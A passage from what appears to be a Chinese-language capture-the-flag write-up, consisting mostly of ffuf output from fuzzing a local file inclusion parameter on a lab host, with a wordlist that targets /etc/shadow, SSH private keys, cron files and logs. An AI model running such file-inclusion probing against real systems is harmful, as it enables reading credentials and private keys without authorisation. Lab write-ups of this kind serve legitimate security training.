1]\n/etc/php/cgi/php.ini    [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/ssh/ssh_host_dsa_key [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/vsftpd.chroot_list [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/resolv.conf        [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/php.ini            [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/vsftpd/vsftpd.conf [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/my.conf            [Status: 200, Size: 0, Words: 1, Lines: 1]\n/proc/cpuinfo           [Status: 200, Size: 0, Words: 1, Lines: 1]\n/proc/filesystems       [Status: 200, Size: 0, Words: 1, Lines: 1]\n/proc/interrupts        [Status: 200, Size: 0, Words: 1, Lines: 1]\n/proc/ioports           [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/syslog.conf        [Status: 200, Size: 0, Words: 1, Lines: 1]\n/proc/modules           [Status: 200, Size: 0, Words: 1, Lines: 1]\n/proc/stat              [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/vsftpd.conf        [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/vhcs2/proftpd/proftpd.conf [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/php/php.ini        [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/wu-ftpd/ftpaccess  [Status: 200, Size: 0, Words: 1, Lines: 1]\n/proc/version           [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/network/interfaces [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/bootptab           [Status: 200, Size: 0, Words: 1, Lines: 1]\n/root/anaconda-ks.cfg   [Status: 200, Size: 0, Words: 1, Lines: 1]\n/opt/xampp/etc/php.ini  [Status: 200, Size: 0, Words: 1, Lines: 1]\n/usr/etc/pure-ftpd.conf [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/ssh/ssh_host_key.pub [Status: 200, Size: 0, Words: 1, Lines: 1]\n/usr/lib/php/php.ini    [Status: 200, Size: 0, Words: 1, Lines: 1]\n/usr/local/apache/conf/modsec.conf [Status: 200, Size: 0, Words: 1, Lines: 1]\n/usr/local/apache/log   [Status: 200, Size: 0, Words: 1, Lines: 1]\n/usr/local/apache/logs  [Status: 200, Size: 0, Words: 1, Lines: 1]\n/usr/local/apache/logs/access_log [Status: 200, Size: 0, Words: 1, Lines: 1]\n/usr/local/apache/logs/access.log [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/httpd/logs/error.log [Status: 200, Size: 0, Words: 1, Lines: 1]\n/usr/local/apache/error_log [Status: 200, Size: 0, Words: 1, Lines: 1]\n/usr/local/cpanel/logs  [Status: 200, Size: 0, Words: 1, Lines: 1]\n/logs/security_log      [Status: 200, Size: 0, Words: 1, Lines: 1]\n/usr/local/cpanel/logs/error_log [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/motd               [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/redhat-release     [Status: 200, Size: 0, Words: 1, Lines: 1]\n/proc/swaps             [Status: 200, Size: 0, Words: 1, Lines: 1]\n/usr/local/etc/httpd/logs/access_log [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/hosts.deny         [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/at.deny            [Status: 200, Size: 0, Words: 1, Lines: 1]\n/usr/local/etc/httpd/logs/error_log [Status: 200, Size: 0, Words: 1, Lines: 1]\n/usr/local/etc/php.ini  [Status: 200, Size: 0, Words: 1, Lines: 1]\n/usr/local/etc/pureftpd.pdb [Status: 200, Size: 0, Words: 1, Lines: 1]\n/usr/local/php4/lib/php.ini [Status: 200, Size: 0, Words: 1, Lines: 1]\n/usr/local/php5/httpd.conf [Status: 200, Size: 0, Words: 1, Lines: 1]\n/usr/lib/php.ini        [Status: 200, Size: 0, Words: 1, Lines: 1]\n/usr/local/php5/lib/php.ini [Status: 200, Size: 0, Words: 1, Lines: 1]\n/usr/local/cpanel/logs/license_log [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/proftp.conf        [Status: 200, Size: 0, Words: 1, Lines: 1]\n/opt/lampp/etc/httpd.conf [Status: 200, Size: 0, Words: 1, Lines: 1]\n/usr/local/php/lib/php.ini [Status: 200, Size: 0, Words: 1, Lines: 1]\n/usr/local/pureftpd/etc/pureftpd.pdn [Status: 200, Size: 0, Words: 1, Lines: 1]\n/usr/local/cpanel/logs/access_log [Status: 200, Size: 0, Words: 1, Lines: 1]\n/usr/local/www/logs/httpd_log [Status: 200, Size: 0, Words: 1, Lines: 1]\n/usr/local/Zend/etc/php.ini [Status: 200, Size: 0, Words: 1, Lines: 1]\n/usr/local/lib/php.ini  [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/wu-ftpd/ftphosts   [Status: 200, Size: 0, Words: 1, Lines: 1]\n/var/adm/log/xferlog    [Status: 200, Size: 0, Words: 1, Lines: 1]\n/usr/local/apache/error.log [Status: 200, Size: 0, Words: 1, Lines: 1]\n/var/apache2/config.inc [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/php4/cgi/php.ini   [Status: 200, Size: 0, Words: 1, Lines: 1]\n/var/apache/logs/error_log [Status: 200, Size: 0, Words: 1, Lines: 1]\n/var/cpanel/cpanel.config [Status: 200, Size: 0, Words: 1, Lines: 1]\n/var/local/www/conf/php.ini [Status: 200, Size: 0, Words: 1, Lines: 1]\n/usr/local/php5/httpd.conf.php [Status: 200, Size: 0, Words: 1, Lines: 1]\n/usr/local/cpanel/logs/stats_log [Status: 200, Size: 0, Words: 1, Lines: 1]\n/usr/sbin/pure-config.pl [Status: 200, Size: 0, Words: 1, Lines: 1]\n/var/log/apache2/access_log [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/snmpd.conf         [Status: 200, Size: 0, Words: 1, Lines: 1]\n/var/log/apache2/access.log [Status: 200, Size: 0, Words: 1, Lines: 1]\n/var/log/apache/access.log [Status: 200, Size: 0, Words: 1, Lines: 1]\n/usr/local/apache/conf/php.ini [Status: 200, Size: 0, Words: 1, Lines: 1]\n/logs/security_debug_log [Status: 200, Size: 0, Words: 1, Lines: 1]\n/var/lib/mysql/my.cnf   [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/ssh/ssh_host_key   [Status: 200, Size: 0, Words: 1, Lines: 1]\n/var/log/apache-ssl/access.log [Status: 200, Size: 0, Words: 1, Lines: 1]\n/usr/local/pureftpd/etc/pure-ftpd.conf [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/inittab            [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/exports            [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/hosts.allow        [Status: 200, Size: 0, Words: 1, Lines: 1]\n/var/log/cups/error.log [Status: 200, Size: 0, Words: 1, Lines: 1]\n/usr/local/pureftpd/sbin/pure-config.pl [Status: 200, Size: 0, Words: 1, Lines: 1]\n/var/log/daemon.log     [Status: 200, Size: 0, Words: 1, Lines: 1]\n/var/log/debug          [Status: 200, Size: 0, Words: 1, Lines: 1]\n/var/log/dmesg          [Status: 200, Size: 0, Words: 1, Lines: 1]\n/usr/local/apache/audit_log [Status: 200, Size: 0, Words: 1, Lines: 1]\n/var/log/dpkg.log       [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/wu-ftpd/ftpusers   [Status: 200, Size: 0, Words: 1, Lines: 1]\n/var/log/exim_mainlog   [Status: 200, Size: 0, Words: 1, Lines: 1]\n/proc/mounts            [Status: 200, Size: 0, Words: 1, Lines: 1]\n/var/log/apache2/error_log [Status: 200, Size: 0, Words: 1, Lines: 1]\n/var/log/exim_paniclog  [Status: 200, Size: 0, Words: 1, Lines: 1]\n/var/log/apache/error.log [Status: 200, Size: 0, Words: 1, Lines: 1]\n/var/log/exim_rejectlog [Status: 200, Size: 0, Words: 1, Lines: 1]\n/var/log/exim/rejectlog [Status: 200, Size: 0, Words: 1, Lines: 1]\n/var/log/faillog        [Status: 200, Size: 0, Words: 1, Lines: 1]\n/var/log/httpd/access_log [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/httpd/conf/httpd.conf [Status: 200, Size: 0, Words: 1, Lines: 1]\n/var/log/httpd/error.log [Status: 200, Size: 0, Words: 1, Lines: 1]\n/proc/meminfo           [Status: 200, Size: 0, Words: 1, Lines: 1]\n/var/htmp               [Status: 200, Size: 0, Words: 1, Lines: 1]\n/var/log/apache-ssl/error.log [Status: 200, Size: 0, Words: 1, Lines: 1]\n/var/log/httpsd/ssl.access_log [Status: 200, Size: 0, Words: 1, Lines: 1]\n/var/log/httpsd/ssl_log [Status: 200, Size: 0, Words: 1, Lines: 1]\n/usr/local/php4/httpd.conf.php [Status: 200, Size: 0, Words: 1, Lines: 1]\n/var/log/kern.log       [Status: 200, Size: 0, Words: 1, Lines: 1]\n/var/log/lighttpd/error.log [Status: 200, Size: 0, Words: 1, Lines: 1]\n/var/log/lighttpd/lighttpd.error.log [Status: 200, Size: 0, Words: 1, Lines: 1]\n/var/log/mail.info      [Status: 200, Size: 0, Words: 1, Lines: 1]\n/var/log/exim/mainlog   [Status: 200, Size: 0, Words: 1, Lines: 1]\n/var/log/ftp-proxy/ftp-proxy.log [Status: 200, Size: 0, Words: 1, Lines: 1]\n/var/log/messages       [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/mtab               [Status: 200, Size: 0, Words: 1, Lines: 1]\n/var/log/lighttpd/access.log [Status: 200, Size: 0, Words: 1, Lines: 1]\n/var/log/mail.warn      [Status: 200, Size: 0, Words: 1, Lines: 1]\n/var/log/httpd/error_log [Status: 200, Size: 0, Words: 1, Lines: 1]\n/usr/local/cpanel/logs/login_log [Status: 200, Size: 0, Words: 1, Lines: 1]\n/var/log/ftp-proxy      [Status: 200, Size: 0, Words: 1, Lines: 1]\n/var/log/mysqlderror.log [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/php4/apache2/php.ini [Status: 200, Size: 0, Words: 1, Lines: 1]\n/var/log/pureftpd.log   [Status: 200, Size: 0, Words: 1, Lines: 1]\n/var/log/pure-ftpd/pure-ftpd.log [Status: 200, Size: 0, Words: 1, Lines: 1]\n/var/log/maillog        [Status: 200, Size: 0, Words: 1, Lines: 1]\n/var/log/mysql.log      [Status: 200, Size: 0, Words: 1, Lines: 1]\n/var/log/message        [Status: 200, Size: 0, Words: 1, Lines: 1]\n/var/log/vsftpd.log     [Status: 200, Size: 0, Words: 1, Lines: 1]\n/var/log/wtmp           [Status: 200, Size: 0, Words: 1, Lines: 1]\n/var/log/ftplog         [Status: 200, Size: 0, Words: 1, Lines: 1]\n/var/log/xferlog        [Status: 200, Size: 0, Words: 1, Lines: 1]\n/var/log/lastlog        [Status: 200, Size: 0, Words: 1, Lines: 1]\n/var/log/yum.log        [Status: 200, Size: 0, Words: 1, Lines: 1]\n/var/spool/cron/crontabs/root [Status: 200, Size: 0, Words: 1, Lines: 1]\n/var/log/apache/access_log [Status: 200, Size: 0, Words: 1, Lines: 1]\n/var/lib/mysql/mysql/user.MYD [Status: 200, Size: 0, Words: 1, Lines: 1]\n/var/www/log/access_log [Status: 200, Size: 0, Words: 1, Lines: 1]\n/var/log/lighttpd/lighttpd.access.log [Status: 200, Size: 0, Words: 1, Lines: 1]\n~/.bash_profile         [Status: 200, Size: 0, Words: 1, Lines: 1]\n~/.bashrc               [Status: 200, Size: 0, Words: 1, Lines: 1]\n/var/log/secure         [Status: 200, Size: 0, Words: 1, Lines: 1]\n/var/webmin/miniserv.log [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/proftpd/proftpd.conf [Status: 200, Size: 0, Words: 1, Lines: 1]\n/var/log/mail.log       [Status: 200, Size: 0, Words: 1, Lines: 1]\n~/.mysql_history        [Status: 200, Size: 0, Words: 1, Lines: 1]\n/logs/pure-ftpd.log     [Status: 200, Size: 0, Words: 1, Lines: 1]\n~/.profile              [Status: 200, Size: 0, Words: 1, Lines: 1]\n~/.ssh/authorized_keys  [Status: 200, Size: 0, Words: 1, Lines: 1]\n~/.atfp_history         [Status: 200, Size: 0, Words: 1, Lines: 1]\n/var/log/apache2/error.log [Status: 200, Size: 0, Words: 1, Lines: 1]\n~/.nano_history         [Status: 200, Size: 0, Words: 1, Lines: 1]\n/var/log/exim.paniclog  [Status: 200, Size: 0, Words: 1, Lines: 1]\n~/.login                [Status: 200, Size: 0, Words: 1, Lines: 1]\n/var/mysql.log          [Status: 200, Size: 0, Words: 1, Lines: 1]\n~/.ssh/id_rsa           [Status: 200, Size: 0, Words: 1, Lines: 1]\n~/.ssh/id_rsa.pub       [Status: 200, Size: 0, Words: 1, Lines: 1]\n~/.php_history          [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/printcap           [Status: 200, Size: 0, Words: 1, Lines: 1]\n/var/log/mysql/mysql-slow.log [Status: 200, Size: 0, Words: 1, Lines: 1]\n~/.ssh/identity.pub     [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/ssh/sshd_config    [Status: 200, Size: 0, Words: 1, Lines: 1]\n~/.viminfo              [Status: 200, Size: 0, Words: 1, Lines: 1]\n~/.wm_style             [Status: 200, Size: 0, Words: 1, Lines: 1]\n/var/log/proftpd        [Status: 200, Size: 0, Words: 1, Lines: 1]\n/var/log/httpd/access.log [Status: 200, Size: 0, Words: 1, Lines: 1]\n~/.xinitrc              [Status: 200, Size: 0, Words: 1, Lines: 1]\n~/.xsession             [Status: 200, Size: 0, Words: 1, Lines: 1]\n/var/log/apache/error_log [Status: 200, Size: 0, Words: 1, Lines: 1]\n/usr/local/php/httpd.conf [Status: 200, Size: 0, Words: 1, Lines: 1]\n~/.logout               [Status: 200, Size: 0, Words: 1, Lines: 1]\n/var/www/logs/error.log [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/pure-ftpd/putreftpd.pdb [Status: 200, Size: 0, Words: 1, Lines: 1]\n~/.ssh/id_dsa           [Status: 200, Size: 0, Words: 1, Lines: 1]\n~/.ssh/id_dsa.pub       [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/php5/apache2/php.ini [Status: 200, Size: 0, Words: 1, Lines: 1]\n~/.bash_logout          [Status: 200, Size: 0, Words: 1, Lines: 1]\n/proc/self/net/arp      [Status: 200, Size: 0, Words: 1, Lines: 1]\n/var/www/logs/access.log [Status: 200, Size: 0, Words: 1, Lines: 1]\n/var/www/logs/access_log [Status: 200, Size: 0, Words: 1, Lines: 1]\n~/.ssh/identity         [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/php4/apache2/php.ini [Status: 200, Size: 0, Words: 1, Lines: 1]\n/usr/local/etc/pure-ftpd.conf [Status: 200, Size: 0, Words: 1, Lines: 1]\n/usr/local/php4/httpd.conf [Status: 200, Size: 0, Words: 1, Lines: 1]\n~/.bash_history         [Status: 200, Size: 0, Words: 1, Lines: 1]\n~/.Xdefaults            [Status: 200, Size: 0, Words: 1, Lines: 1]\n/usr/local/php/httpd.conf.ini [Status: 200, Size: 0, Words: 1, Lines: 1]\n~/.gtkrc                [Status: 200, Size: 0, Words: 1, Lines: 1]\n/var/www/log/error_log  [Status: 200, Size: 0, Words: 1, Lines: 1]\n/var/apache/logs/access_log [Status: 200, Size: 0, Words: 1, Lines: 1]\n~/.Xresources           [Status: 200, Size: 0, Words: 1, Lines: 1]\n/var/log/auth.log       [Status: 200, Size: 0, Words: 1, Lines: 1]\n/var/log/boot           [Status: 200, Size: 0, Words: 1, Lines: 1]\n/var/log/chttp.log      [Status: 200, Size: 0, Words: 1, Lines: 1]\n/var/log/mysql/mysql-bin.log [Status: 200, Size: 0, Words: 1, Lines: 1]\n/var/log/mysql/mysql.log [Status: 200, Size: 0, Words: 1, Lines: 1]\n/var/run/utmp           [Status: 200, Size: 0, Words: 1, Lines: 1]\n/var/www/logs/error_log [Status: 200, Size: 0, Words: 1, Lines: 1]\n:: Progress: [257/257] :: Job [1/1] :: 19 req/sec :: Duration: [0:00:23] :: Errors: 0 ::\n```\n这边可以fuzz出来，但内容都是0，证明参数不对，尝试一下其他参数\n\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# ffuf -u \"http://10.10.11.135/image.php?img=FUZZ\" -w /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt -fs 0\n\n        /'___\\  /'___\\           /'___\\       \n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       \n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\      \n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/      \n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\       \n          \\/_/    \\/_/   \\/___/    \\/_/       \n\n       v1.3.1 Kali Exclusive <3\n________________________________________________\n\n :: Method           : GET\n :: URL              : http://10.10.11.135/image.php?img=FUZZ\n :: Wordlist         : FUZZ: /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt\n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 40\n :: Matcher          : Response status: 200,204,301,302,307,401,403,405\n :: Filter           : Response size: 0\n________________________________________________\n\n/etc/aliases            [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/at.allow           [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/hosts.deny         [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/httpd/access.conf  [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/httpd/conf/httpd.conf [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/cups/cupsd.conf    [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/ftpchroot          [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/chrootUsers        [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/groups             [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/lilo.conf          [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/httpd/httpd.conf   [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/httpd/logs/access.log [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/shadow             [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/httpd/logs/access_log [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/httpd/php.ini      [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/inittab            [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/hosts.allow        [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/inetd.conf         [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/httpd/srm.conf     [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/motd               [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/logrotate.d/proftpd [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/logrotate.d/vsftpd.log [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/httpd/logs/error.log [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/apache2/apache2.conf [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/ftpaccess          [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/modules.conf       [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/mtab               [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/php5/apache2/php.ini [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/bashrc             [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/anacrontab         [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/php/apache2/php.ini [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/php/php4/php.ini   [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/passwd             [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/issue              [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/chttp.conf         [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/exports            [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/pure-ftpd/pure-ftpd.conf [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/network/interfaces [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/php4/apache2/php.ini [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/cron.deny          [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/my.conf            [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/fstab              [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/grub.conf          [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/php4/cgi/php.ini   [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/pureftpd.passwd    [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/pure-ftpd/putreftpd.pdb [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/pureftpd.pdb       [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/redhat-release     [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/ssh/ssh_config     [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/snmpd.conf         [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/ssh/ssh_host_dsa_key.pub [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/passwd             [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/pure-ftpd/pure-ftpd.pdb [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/my.cnf             [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/termcap            [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/proftpd/proftpd.conf [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/vhcs2/proftpd/proftpd.conf [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/php4.4/fcgi/php.ini [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/php4/apache/php.ini [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/php5/apache/php.ini [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/printcap           [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/php4/apache2/php.ini [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/httpd/logs/error_log [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/cron.allow         [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/apache2/httpd.conf [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/vsftpd/vsftpd.conf [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/wu-ftpd/ftpaccess  [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/wu-ftpd/ftphosts   [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/ssh/sshd_config    [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/wu-ftpd/ftpusers   [Status: 200, Size: 25, Words: 3, Lines: 1]\n/logs/security_log      [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/samba/smb.conf     [Status: 200, Size: 25, Words: 3, Lines: 1]\n/proc/filesystems       [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/ssh/ssh_host_dsa_key [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/php/apache/php.ini [Status: 200, Size: 25, Words: 3, Lines: 1]\n/proc/stat              [Status: 200, Size: 25, Words: 3, Lines: 1]\n/proc/swaps             [Status: 200, Size: 25, Words: 3, Lines: 1]\n/root/anaconda-ks.cfg   [Status: 200, Size: 25, Words: 3, Lines: 1]\n/usr/etc/pure-ftpd.conf [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/ftphosts           [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/npasswd            [Status: 200, Size: 25, Words: 3, Lines: 1]\n/usr/lib/php/php.ini    [Status: 200, Size: 25, Words: 3, Lines: 1]\n/logs/security_debug_log [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/php/cgi/php.ini    [Status: 200, Size: 25, Words: 3, Lines: 1]\n/proc/modules           [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/ssh/ssh_host_key.pub [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/php/php.ini        [Status: 200, Size: 25, Words: 3, Lines: 1]\n/proc/version           [Status: 200, Size: 25, Words: 3, Lines: 1]\n/proc/ioports           [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/hosts              [Status: 200, Size: 25, Words: 3, Lines: 1]\n/usr/local/apache/error_log [Status: 200, Size: 25, Words: 3, Lines: 1]\n/usr/local/cpanel/logs  [Status: 200, Size: 25, Words: 3, Lines: 1]\n/proc/meminfo           [Status: 200, Size: 25, Words: 3, Lines: 1]\n/usr/local/cpanel/logs/error_log [Status: 200, Size: 25, Words: 3, Lines: 1]\n/usr/local/apache/conf/modsec.conf [Status: 200, Size: 25, Words: 3, Lines: 1]\n/usr/local/cpanel/logs/license_log [Status: 200, Size: 25, Words: 3, Lines: 1]\n/usr/local/cpanel/logs/login_log [Status: 200, Size: 25, Words: 3, Lines: 1]\n/usr/local/apache/log   [Status: 200, Size: 25, Words: 3, Lines: 1]\n/usr/local/apache/logs/access_log [Status: 200, Size: 25, Words: 3, Lines: 1]\n/proc/mounts            [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/mysql/my.cnf       [Status: 200, Size: 25, Words: 3, Lines: 1]\n/usr/local/etc/php.ini  [Status: 200, Size: 25, Words: 3, Lines: 1]\n/usr/local/etc/pure-ftpd.conf [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/proftp.conf        [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/profile            [Status: 200, Size: 25, Words: 3, Lines: 1]\n/usr/local/php4/httpd.conf [Status: 200, Size: 25, Words: 3, Lines: 1]\n/usr/local/php4/lib/php.ini [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/vsftpd.conf        [Status: 200, Size: 25, Words: 3, Lines: 1]\n/usr/local/php5/httpd.conf.php [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/pure-ftpd.conf     [Status: 200, Size: 25, Words: 3, Lines: 1]\n/usr/local/cpanel/logs/stats_log [Status: 200, Size: 25, Words: 3, Lines: 1]\n/proc/interrupts        [Status: 200, Size: 25, Words: 3, Lines: 1]\n/usr/lib/php.ini        [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/sysconfig/network  [Status: 200, Size: 25, Words: 3, Lines: 1]\n/usr/local/pureftpd/etc/pure-ftpd.conf [Status: 200, Size: 25, Words: 3, Lines: 1]\n/usr/local/pureftpd/etc/pureftpd.pdn [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/vsftpd.chroot_list [Status: 200, Size: 25, Words: 3, Lines: 1]\n/usr/local/apache/audit_log [Status: 200, Size: 25, Words: 3, Lines: 1]\n/usr/local/Zend/etc/php.ini [Status: 200, Size: 25, Words: 3, Lines: 1]\n/usr/sbin/pure-config.pl [Status: 200, Size: 25, Words: 3, Lines: 1]\n/var/adm/log/xferlog    [Status: 200, Size: 25, Words: 3, Lines: 1]\n/var/apache/logs/access_log [Status: 200, Size: 25, Words: 3, Lines: 1]\n/opt/lampp/etc/httpd.conf [Status: 200, Size: 25, Words: 3, Lines: 1]\n/var/lib/mysql/my.cnf   [Status: 200, Size: 25, Words: 3, Lines: 1]\n/usr/local/php/httpd.conf.ini [Status: 200, Size: 25, Words: 3, Lines: 1]\n/usr/local/pureftpd/sbin/pure-config.pl [Status: 200, Size: 25, Words: 3, Lines: 1]\n/usr/local/apache/logs  [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/syslog.conf        [Status: 200, Size: 25, Words: 3, Lines: 1]\n/var/log/apache2/access.log [Status: 200, Size: 25, Words: 3, Lines: 1]\n/usr/local/lib/php.ini  [Status: 200, Size: 25, Words: 3, Lines: 1]\n/var/log/apache2/error.log [Status: 200, Size: 25, Words: 3, Lines: 1]\n/var/log/apache/access_log [Status: 200, Size: 25, Words: 3, Lines: 1]\n/logs/pure-ftpd.log     [Status: 200, Size: 25, Words: 3, Lines: 1]\n/var/log/apache-ssl/error.log [Status: 200, Size: 25, Words: 3, Lines: 1]\n/opt/xampp/etc/php.ini  [Status: 200, Size: 25, Words: 3, Lines: 1]\n/usr/local/apache/conf/php.ini [Status: 200, Size: 25, Words: 3, Lines: 1]\n/usr/local/php5/lib/php.ini [Status: 200, Size: 25, Words: 3, Lines: 1]\n/usr/local/etc/pureftpd.pdb [Status: 200, Size: 25, Words: 3, Lines: 1]\n/var/cpanel/cpanel.config [Status: 200, Size: 25, Words: 3, Lines: 1]\n/var/log/apache/access.log [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/lsb-release        [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/logrotate.d/ftp    [Status: 200, Size: 25, Words: 3, Lines: 1]\n/var/local/www/conf/php.ini [Status: 200, Size: 25, Words: 3, Lines: 1]\n/var/htmp               [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/networks           [Status: 200, Size: 25, Words: 3, Lines: 1]\n/usr/local/www/logs/httpd_log [Status: 200, Size: 25, Words: 3, Lines: 1]\n/var/log/cups/error.log [Status: 200, Size: 25, Words: 3, Lines: 1]\n/var/log/apache/error.log [Status: 200, Size: 25, Words: 3, Lines: 1]\n/var/lib/mysql/mysql/user.MYD [Status: 200, Size: 25, Words: 3, Lines: 1]\n/var/log/daemon.log     [Status: 200, Size: 25, Words: 3, Lines: 1]\n/var/log/debug          [Status: 200, Size: 25, Words: 3, Lines: 1]\n/var/log/dpkg.log       [Status: 200, Size: 25, Words: 3, Lines: 1]\n/var/log/exim/mainlog   [Status: 200, Size: 25, Words: 3, Lines: 1]\n/var/log/exim.paniclog  [Status: 200, Size: 25, 